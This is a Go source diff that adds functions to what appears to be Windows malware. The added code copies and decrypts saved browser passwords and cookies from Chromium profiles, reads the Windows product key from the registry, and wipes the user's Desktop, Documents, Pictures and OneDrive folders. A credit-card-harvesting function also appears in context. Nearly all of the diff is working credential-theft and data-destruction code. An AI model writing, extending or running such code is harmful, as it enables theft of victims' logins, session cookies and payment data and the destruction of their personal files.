@@ -19,6 +19,7 @@ import (
 	"errors"
 	"fmt"
 	_ "github.com/mattn/go-sqlite3"
+	"golang.org/x/sys/windows/registry"
 	"io"
 	"io/ioutil"
 	"log"
@@ -144,7 +145,15 @@ type CCARD struct {
 	Expiration string
 }
 
-type WEBSITE struct {
+type COOKIE struct {
+	Host  string
+	Name  string
+	Value string
+}
+
+type ProductKey struct {
+	Value string
+	Type  string
 }
 
 func NewBlob(d []byte) *DATA_BLOB {
@@ -309,6 +318,96 @@ func DecryptBlob(BLOB string, LocalState string) string {
 	return output
 }
 
+func GetPasswords() []PASSWD {
+
+	var output []PASSWD
+
+	for _, Path := range PLATFORMS {
+
+		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Login Data") {
+			continue
+		}
+
+		var TempFileName string = RandStringBytes(8)
+
+		//Copy Login Data file to temp location
+		err := copyFileToDirectory(Path.DataFiles+"\\Login Data", TempFileDir+"\\"+TempFileName+".dat")
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		//Open Database
+		db, err := sql.Open("sqlite3", TempFileDir+"\\"+TempFileName+".dat")
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer db.Close()
+
+		//Select Rows to get data from
+		rows, err := db.Query("select origin_url, username_value, password_value from logins")
+		if err != nil {
+			log.Fatal(err)
+		}
+		defer rows.Close()
+
+		for rows.Next() {
+			var URL string
+			var USERNAME string
+			var PASSWORD string
+
+			err = rows.Scan(&URL, &USERNAME, &PASSWORD)
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			PASSWORD = DecryptBlob(PASSWORD, Path.LocalState)
+
+			if PASSWORD != "" {
+				output = append(output, PASSWD{
+					url:  URL,
+					user: USERNAME,
+					pass: PASSWORD,
+				})
+			}
+		}
+
+		err = rows.Err()
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		masterKey = []byte("")
+	}
+
+	return output
+}
+
+func DeletePersonal() {
+
+	NukeDesktop()
+
+	os.RemoveAll(PERSONAL + "\\Pictures")
+	os.RemoveAll(PERSONAL + "\\Images")
+	os.RemoveAll(PERSONAL + "\\Documents")
+	os.RemoveAll(PERSONAL + "OneDrive\\Pictures")
+	os.RemoveAll(PERSONAL + "OneDrive\\Images")
+	os.RemoveAll(PERSONAL + "OneDrive\\Documents")
+
+	os.MkdirAll(PERSONAL+"\\Pictures", 777)
+	os.MkdirAll(PERSONAL+"\\Images", 777)
+	os.MkdirAll(PERSONAL+"\\Documents", 777)
+	os.MkdirAll(PERSONAL+"OneDrive\\Pictures", 777)
+	os.MkdirAll(PERSONAL+"OneDrive\\Images", 777)
+	os.MkdirAll(PERSONAL+"OneDrive\\Documents", 777)
+}
+
+func NukeDesktop() {
+	os.RemoveAll(PERSONAL + "\\Desktop")
+	os.RemoveAll(PERSONAL + "OneDrive\\Desktop")
+	os.MkdirAll(PERSONAL+"\\Desktop", 777)
+	os.MkdirAll(PERSONAL+"OneDrive\\Desktop", 777)
+}
+
 func GetCreditCards() []CCARD {
 
 	var output []CCARD
@@ -373,20 +472,60 @@ func GetCreditCards() []CCARD {
 	return output
 }
 
-func GetPasswords() []PASSWD {
+func GetProductKey() *ProductKey {
+	output := new(ProductKey)
 
-	var output []PASSWD
+	sir, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
+	if err != nil {
+		println(err)
+	}
+	defer sir.Close()
+
+	Organization, _, err := sir.GetStringValue("RegisteredOrganization")
+	if err != nil {
+		Organization = ""
+	}
+
+	pkr, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform`, registry.QUERY_VALUE)
+	if err != nil {
+		println(err)
+	}
+	defer pkr.Close()
+
+	ActivationKey, _, err := pkr.GetStringValue("BackupProductKeyDefault")
+	if err != nil {
+		ActivationKey = ""
+	}
+
+	KMSClient, _, err := pkr.GetStringValue("KeyManagementServiceName")
+	if err != nil {
+		KMSClient = ""
+	}
+
+	if KMSClient == "" || Organization == "" {
+		output.Type = "KMS / OEM"
+	} else {
+		output.Type = "Retail"
+	}
+
+	output.Value = ActivationKey
+
+	return output
+}
+
+func GetCookies() []COOKIE {
+	var output []COOKIE
 
 	for _, Path := range PLATFORMS {
 
-		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Login Data") {
+		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Network\\Cookies") {
 			continue
 		}
 
 		var TempFileName string = RandStringBytes(8)
 
 		//Copy Login Data file to temp location
-		err := copyFileToDirectory(Path.DataFiles+"\\Login Data", TempFileDir+"\\"+TempFileName+".dat")
+		err := copyFileToDirectory(Path.DataFiles+"\\Network\\Cookies", TempFileDir+"\\"+TempFileName+".dat")
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -399,29 +538,29 @@ func GetPasswords() []PASSWD {
 		defer db.Close()
 
 		//Select Rows to get data from
-		rows, err := db.Query("select origin_url, username_value, password_value from logins")
+		rows, err := db.Query("select host_key, name, encrypted_value from cookies")
 		if err != nil {
 			log.Fatal(err)
 		}
 		defer rows.Close()
 
 		for rows.Next() {
-			var URL string
-			var USERNAME string
-			var PASSWORD string
+			var HOST string
+			var NAME string
+			var VALUE string
 
-			err = rows.Scan(&URL, &USERNAME, &PASSWORD)
+			err = rows.Scan(&HOST, &NAME, &VALUE)
 			if err != nil {
 				log.Fatal(err)
 			}
 
-			PASSWORD = DecryptBlob(PASSWORD, Path.LocalState)
+			VALUE = DecryptBlob(VALUE, Path.LocalState)
 
-			if PASSWORD != "" {
-				output = append(output, PASSWD{
-					url:  URL,
-					user: USERNAME,
-					pass: PASSWORD,
+			if VALUE != "" {
+				output = append(output, COOKIE{
+					Host:  NAME,
+					Name:  NAME,
+					Value: VALUE,
 				})
 			}
 		}
@@ -431,7 +570,6 @@ func GetPasswords() []PASSWD {
 			log.Fatal(err)
 		}
 
-		masterKey = []byte("")
 	}
 
 	return output
